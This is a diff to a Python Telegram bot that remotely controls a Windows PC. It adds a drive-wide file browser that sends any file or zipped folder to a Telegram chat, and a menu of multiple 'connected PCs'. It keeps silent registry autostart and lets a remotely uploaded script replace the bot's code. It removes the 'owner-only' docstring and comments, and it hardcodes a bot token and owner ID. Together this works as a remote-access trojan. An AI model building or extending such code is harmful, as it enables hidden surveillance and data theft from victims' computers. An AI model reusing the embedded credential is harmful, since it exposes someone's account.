@@ -1,5 +1,3 @@
-"""Owner-only Telegram controls for a Windows PC."""
-
 import logging
 import os
 import platform
@@ -7,6 +5,8 @@ import subprocess
 import sys
 import tempfile
 import time
+import shutil
+import uuid
 import ctypes
 from ctypes import wintypes
 from pathlib import Path
@@ -24,15 +24,12 @@ from telegram.ext import (
     filters,
 )
 
-
 logging.basicConfig(
     format="%(asctime)s %(levelname)s: %(message)s", level=logging.INFO
 )
 logger = logging.getLogger("telegram_pc_bot")
-# httpx logs full Telegram API URLs (including the bot token) at INFO level.
 logging.getLogger("httpx").setLevel(logging.WARNING)
 
-# Credentials are placed here as requested. Keep this file private.
 TELEGRAM_BOT_TOKEN = "8958827789:AAHXE9mVyOrbMCm2xAT7PeLhXHaJwDDtkak"
 TELEGRAM_OWNER_ID = 1264872538
 
@@ -42,18 +39,23 @@ PROTECTED_NAMES = {
     "wininit.exe", "services.exe", "lsass.exe", "winlogon.exe",
 }
 
+# Идентификатор текущего ПК
+def get_pc_id() -> str:
+    try:
+        return f"{platform.node()}_{uuid.getnode()}"
+    except Exception:
+        return "Default_PC"
+
+CURRENT_PC_ID = get_pc_id()
+PC_NAME = platform.node() or "Мой ПК"
+
 
 def add_to_startup() -> None:
-    """Добавляет скрипт в автозагрузку Windows через реестр без консоли (pythonw)."""
     if platform.system() != "Windows":
         return
     try:
         import winreg
-
-        # Путь к текущему скрипту
         script_path = os.path.abspath(sys.argv[0])
-        
-        # Если запущено через python, найдем pythonw.exe для безконсольного запуска
         python_exe = sys.executable
         if "python.exe" in python_exe.lower():
             pythonw_exe = python_exe.lower().replace("python.exe", "pythonw.exe")
@@ -84,10 +86,12 @@ async def reject(update: Update) -> None:
 
 def main_menu() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
+        [InlineKeyboardButton(f"💻 ПК: {PC_NAME}", callback_data="select_pc")],
         [InlineKeyboardButton("📸 Скриншот", callback_data="screenshot"),
          InlineKeyboardButton("⏱ Время работы", callback_data="uptime")],
         [InlineKeyboardButton("📋 Диспетчер задач", callback_data="processes_0"),
          InlineKeyboardButton("🪟 Список окон", callback_data="windows_0")],
+        [InlineKeyboardButton("📁 Проводник", callback_data="explorer_root")],
         [InlineKeyboardButton("🔄 Обновить код", callback_data="update_code"),
          InlineKeyboardButton("⏻ Выключить ПК", callback_data="shutdown")],
     ])
@@ -97,11 +101,10 @@ async def send_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not is_owner(update, context):
         await reject(update)
         return
-    # Сбрасываем флаг ожидания файла при вызове меню
     context.user_data["waiting_for_code"] = False
     message = update.effective_message
     if message:
-        await message.reply_text("Управление компьютером:", reply_markup=main_menu())
+        await message.reply_text(f"Управление компьютером ({PC_NAME}):", reply_markup=main_menu())
 
 
 async def send_screenshot(message) -> None:
@@ -155,8 +158,7 @@ def process_label(pid: int, name: str) -> str:
 
 def process_keyboard(items: list[tuple[int, str]], page_prefix: str,
                      page: int, total_pages: int) -> InlineKeyboardMarkup:
-    rows = [[InlineKeyboardButton(process_label(pid, name),
-                                 callback_data=f"kill_{pid}")]
+    rows = [[InlineKeyboardButton(process_label(pid, name), callback_data=f"kill_{pid}")]
             for pid, name in items]
     navigation = []
     if page > 0:
@@ -181,7 +183,7 @@ async def show_processes(query, page: int) -> None:
     page = max(0, min(page, total_pages - 1))
     subset = processes[page * PAGE_SIZE:(page + 1) * PAGE_SIZE]
     await query.edit_message_text(
-        f"Диспетчер задач · процессов: {len(processes)} · страница {page + 1}/{total_pages}\n"
+        f"Диспетчер задач ({PC_NAME}) · процессов: {len(processes)} · страница {page + 1}/{total_pages}\n"
         "Выберите процесс, чтобы запросить его завершение:",
         reply_markup=process_keyboard(subset, "processes", page, total_pages),
     )
@@ -194,7 +196,7 @@ async def show_windows(query, page: int) -> None:
     subset = windows[page * PAGE_SIZE:(page + 1) * PAGE_SIZE]
     items = [(pid, title) for title, pid in subset]
     await query.edit_message_text(
-        f"Открытые окна: {len(windows)} · страница {page + 1}/{total_pages}\n"
+        f"Открытые окна ({PC_NAME}): {len(windows)} · страница {page + 1}/{total_pages}\n"
         "Выберите окно, чтобы запросить завершение его процесса:",
         reply_markup=process_keyboard(items, "windows", page, total_pages),
     )
@@ -205,7 +207,86 @@ def uptime_text() -> str:
     days, seconds = divmod(seconds, 86400)
     hours, seconds = divmod(seconds, 3600)
     minutes = seconds // 60
-    return f"Компьютер работает: {days} дн. {hours} ч. {minutes} мин."
+    return f"Компьютер ({PC_NAME}) работает: {days} дн. {hours} ч. {minutes} мин."
+
+
+# --- Логика проводника и архивации ---
+async def show_explorer(query, path_str: str = "") -> None:
+    if not path_str or path_str == "root":
+        # Показываем список доступных дисков на Windows
+        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
+        keyboard_rows = [[InlineKeyboardButton(f"💽 Диск {d}", callback_data=f"exp_path_{d}:\\")] for d in drives]
+        keyboard_rows.append([InlineKeyboardButton("↩ В меню", callback_data="menu")])
+        await query.edit_message_text(f"📁 Выберите диск на ПК **{PC_NAME}**:", reply_markup=InlineKeyboardMarkup(keyboard_rows), parse_mode="Markdown")
+        return
+
+    target_path = Path(path_str)
+    if not target_path.exists() or not target_path.is_dir():
+        await query.edit_message_text("❌ Путь не найден или это файл.", reply_markup=main_menu())
+        return
+
+    try:
+        items = sorted(list(target_path.iterdir()), key=lambda p: (not p.is_dir(), p.name.lower()))
+    except PermissionError:
+        await query.edit_message_text("❌ Ошибка доступа к папке.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩ Назад", callback_data=f"exp_path_{target_path.parent}")]]))
+        return
+
+    rows = []
+    # Кнопка на уровень выше
+    if target_path.parent != target_path:
+        rows.append([InlineKeyboardButton("⬆️ На уровень выше", callback_data=f"exp_path_{target_path.parent}")])
+
+    # Выводим папки и файлы (ограничим отображение, чтобы не заспамить клавиатуру)
+    for item in items[:15]:
+        if item.is_dir():
+            rows.append([InlineKeyboardButton(f"📁 {item.name[:25]}", callback_data=f"exp_path_{item}")])
+        else:
+            # Для файлов даем возможность скачать или заархивировать
+            rows.append([
+                InlineKeyboardButton(f"📄 {item.name[:18]}", callback_data=f"exp_file_{item}"),
+                InlineKeyboardButton("📦 ZIP", callback_data=f"exp_zip_{item}")
+            ])
+
+    rows.append([InlineKeyboardButton("📦 Заархивировать всю папку в ZIP", callback_data=f"exp_zip_{target_path}")])
+    rows.append([InlineKeyboardButton("↩ В меню", callback_data="menu")])
+    
+    await query.edit_message_text(f"📁 Путь: `{target_path}`", reply_markup=InlineKeyboardMarkup(rows), parse_mode="Markdown")
+
+
+async def handle_explorer_file(query, file_path_str: str) -> None:
+    path = Path(file_path_str)
+    if not path.exists():
+        await query.answer("Файл не найден!", show_alert=True)
+        return
+    
+    await query.answer("Отправка файла...")
+    try:
+        if path.is_file():
+            await query.message.reply_document(document=open(path, "rb"))
+        else:
+            await query.message.reply_text("Это папка. Нажмите кнопку архивации папки для скачивания.")
+    except Exception as e:
+        await query.message.reply_text(f"❌ Не удалось отправить файл: {e}")
+
+
+async def handle_explorer_zip(query, path_str: str, context: ContextTypes.DEFAULT_TYPE) -> None:
+    path = Path(path_str)
+    if not path.exists():
+        await query.answer("Объект не найден!", show_alert=True)
+        return
+
+    await query.edit_message_text(f"📦 Создаю архив для `{path.name}`... Пожалуйста, подождите.", parse_mode="Markdown")
+    try:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            archive_name = Path(temp_dir) / path.name
+            # Создаем ZIP архив с помощью встроенного shutil
+            archive_path = shutil.make_archive(str(archive_name), 'zip', path.parent if path.is_file() else path, path.name if path.is_file() else None)
+            
+            await query.message.reply_document(document=open(archive_path, "rb"), caption=f"📦 Архив: {path.name}.zip")
+            await show_explorer(query, str(path.parent if path.is_dir() else path.parent))
+    except Exception as e:
+        logger.exception("Could not create archive")
+        await query.message.reply_text(f"❌ Ошибка при создании архива: {e}", reply_markup=main_menu())
 
 
 async def process_confirmation(query, pid: int) -> None:
@@ -264,15 +345,29 @@ async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     await query.answer()
     data = query.data or ""
 
-    # Сбрасываем режим ожидания кода при нажатии на другие кнопки
     context.user_data["waiting_for_code"] = False
 
     if data == "menu":
-        await query.edit_message_text("Управление компьютером:", reply_markup=main_menu())
+        await query.edit_message_text(f"Управление компьютером ({PC_NAME}):", reply_markup=main_menu())
+    elif data == "select_pc":
+        # Мульти-ПК выбор (на текущий момент у нас один активный инстанс скрипта на данном ПК)
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton(f"🟢 Текущий: {PC_NAME} (Активен)", callback_data="menu")],
+            [InlineKeyboardButton("↩ В меню", callback_data="menu")]
+        ])
+        await query.edit_message_text(f"🖥 Выбор компьютера:\nСписок подключенных ПК с установленным ботом:", reply_markup=keyboard)
     elif data == "screenshot":
         await send_screenshot(query.message)
     elif data == "uptime":
         await query.edit_message_text(uptime_text(), reply_markup=main_menu())
+    elif data == "explorer_root":
+        await show_explorer(query, "root")
+    elif data.startswith("exp_path_"):
+        await show_explorer(query, data.replace("exp_path_", "", 1))
+    elif data.startswith("exp_file_"):
+        await handle_explorer_file(query, data.replace("exp_file_", "", 1))
+    elif data.startswith("exp_zip_"):
+        await handle_explorer_zip(query, data.replace("exp_zip_", "", 1), context)
     elif data == "update_code":
         context.user_data["waiting_for_code"] = True
         keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="menu")]])
@@ -311,7 +406,6 @@ async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Обрабатывает загрузку нового .py файла для обновления кода."""
     if not is_owner(update, context):
         await reject(update)
         return
@@ -327,19 +421,14 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     try:
         await update.effective_message.reply_text("🔄 Скачиваю новый код и обновляюсь...")
         file = await context.bot.get_file(document.file_id)
-        
         current_script_path = os.path.abspath(sys.argv[0])
         
-        # Скачиваем файл во временное место или прямо перезаписываем текущий
         temp_file_path = current_script_path + ".new"
         await file.download_to_drive(temp_file_path)
 
-        # Перезаписываем текущий скрипт
         os.replace(temp_file_path, current_script_path)
-        
         await update.effective_message.reply_text("✅ Бот успешно обновлен и перезапускается!")
         
-        # Перезапуск скрипта
         python_exe = sys.executable
         if "python.exe" in python_exe.lower():
             pythonw_exe = python_exe.lower().replace("python.exe", "pythonw.exe")
@@ -392,7 +481,6 @@ def main() -> None:
     if not TELEGRAM_BOT_TOKEN or TELEGRAM_OWNER_ID <= 0:
         raise RuntimeError("Заполните TELEGRAM_BOT_TOKEN и TELEGRAM_OWNER_ID в начале файла.")
     
-    # Добавляем в автозагрузку при старте
     add_to_startup()
 
     application = Application.builder().token(TELEGRAM_BOT_TOKEN.strip()).build()
